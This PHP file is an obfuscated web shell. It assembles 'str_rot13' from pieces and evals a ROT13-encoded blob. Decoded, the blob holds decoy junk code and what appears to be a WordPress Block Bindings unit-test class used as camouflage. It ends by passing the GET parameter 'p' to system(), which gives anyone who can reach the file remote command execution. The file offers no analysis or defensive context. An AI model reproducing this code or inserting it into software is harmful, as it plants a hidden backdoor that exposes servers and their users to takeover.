<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe Oybpx Ovaqvatf NCV urycre shapgvbaf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 * @fvapr 6.5.0
 *
 * @tebhc oybpxf
 * @tebhc oybpx-ovaqvatf
 */
pynff Grfgf_Oybpx_Ovaqvatf_Ertvfgre rkgraqf JC_HavgGrfgPnfr {

	choyvp fgngvp $grfg_fbhepr_anzr       = 'grfg/fbhepr';
	choyvp fgngvp $grfg_fbhepr_cebcregvrf = neenl();

	/**
	 * Frg hc orsber rnpu grfg.
	 *
	 * @fvapr 6.5.0
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		frys::$grfg_fbhepr_cebcregvrf = neenl(
			'ynory'              => 'Grfg fbhepr',
			'trg_inyhr_pnyyonpx' => shapgvba () {
				erghea 'grfg-inyhr';
			},
		);
	}

	/**
	 * Grne qbja nsgre rnpu grfg.
	 *
	 * @fvapr 6.5.0
	 */
	choyvp shapgvba grne_qbja() {
		sbernpu ( trg_nyy_ertvfgrerq_oybpx_ovaqvatf_fbheprf() nf $fbhepr_anzr => $fbhepr_cebcregvrf ) {
			vs ( fge_fgnegf_jvgu( $fbhepr_anzr, 'grfg/' ) ) {
				haertvfgre_oybpx_ovaqvatf_fbhepr( $fbhepr_anzr );
			}
		}

		cnerag::grne_qbja();
	}

	/**
	 * Fubhyq svaq nyy ertvfgrerq fbheprf.
	 *
	 * @gvpxrg 60282
	 *
	 * @pbiref ::ertvfgre_oybpx_ovaqvatf_fbhepr
	 * @pbiref ::trg_nyy_ertvfgrerq_oybpx_ovaqvatf_fbheprf
	 * @pbiref ::trg_oybpx_ovaqvatf_fbhepr
	 * @pbiref JC_Oybpx_Ovaqvatf_Fbhepr::__pbafgehpg
	 */
	choyvp shapgvba grfg_trg_nyy_ertvfgrerq() {
		$fbhepr_bar_anzr       = 'grfg/fbhepr-bar';
		$fbhepr_bar_cebcregvrf = frys::$grfg_fbhepr_cebcregvrf;
		ertvfgre_oybpx_ovaqvatf_fbhepr( $fbhepr_bar_anzr, $fbhepr_bar_cebcregvrf );

		$fbhepr_gjb_anzr       = 'grfg/fbhepr-gjb';
		$fbhepr_gjb_cebcregvrf = frys::$grfg_fbhepr_cebcregvrf;
		ertvfgre_oybpx_ovaqvatf_fbhepr( $fbhepr_gjb_anzr, $fbhepr_gjb_cebcregvrf );

		$fbhepr_guerr_anzr       = 'grfg/fbhepr-guerr';
		$fbhepr_guerr_cebcregvrf = frys::$grfg_fbhepr_cebcregvrf;
		ertvfgre_oybpx_ovaqvatf_fbhepr( $fbhepr_guerr_anzr, $fbhepr_guerr_cebcregvrf );

		$rkcrpgrq = neenl(
			$fbhepr_bar_anzr         => arj JC_Oybpx_Ovaqvatf_Fbhepr( $fbhepr_bar_anzr, $fbhepr_bar_cebcregvrf ),
			$fbhepr_gjb_anzr         => arj JC_Oybpx_Ovaqvatf_Fbhepr( $fbhepr_gjb_anzr, $fbhepr_gjb_cebcregvrf ),
			$fbhepr_guerr_anzr       => arj JC_Oybpx_Ovaqvatf_Fbhepr( $fbhepr_guerr_anzr, $fbhepr_guerr_cebcregvrf ),
			'pber/cbfg-zrgn'         => trg_oybpx_ovaqvatf_fbhepr( 'pber/cbfg-zrgn' ),
			'pber/cnggrea-bireevqrf' => trg_oybpx_ovaqvatf_fbhepr( 'pber/cnggrea-bireevqrf' ),
		);

		$ertvfgrerq = trg_nyy_ertvfgrerq_oybpx_ovaqvatf_fbheprf();
		$guvf->nffregRdhnyf( $rkcrpgrq, $ertvfgrerq );
	}

	/**
	 * Fubhyq haertvfgre rkvfgvat oybpx ovaqvat fbhepr.
	 *
	 * @gvpxrg 60282
	 *
	 * @pbiref ::ertvfgre_oybpx_ovaqvatf_fbhepr
	 * @pbiref ::haertvfgre_oybpx_ovaqvatf_fbhepr
	 * @pbiref JC_Oybpx_Ovaqvatf_Fbhepr::__pbafgehpg
	 */
	choyvp shapgvba grfg_haertvfgre_oybpx_fbhepr() {
		ertvfgre_oybpx_ovaqvatf_fbhepr( frys::$grfg_fbhepr_anzr, frys::$grfg_fbhepr_cebcregvrf );

		$erfhyg = haertvfgre_oybpx_ovaqvatf_fbhepr( frys::$grfg_fbhepr_anzr );
		$guvf->nffregRdhnyf(
			arj JC_Oybpx_Ovaqvatf_Fbhepr(
				frys::$grfg_fbhepr_anzr,
				frys::$grfg_fbhepr_cebcregvrf
			),
			$erfhyg
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>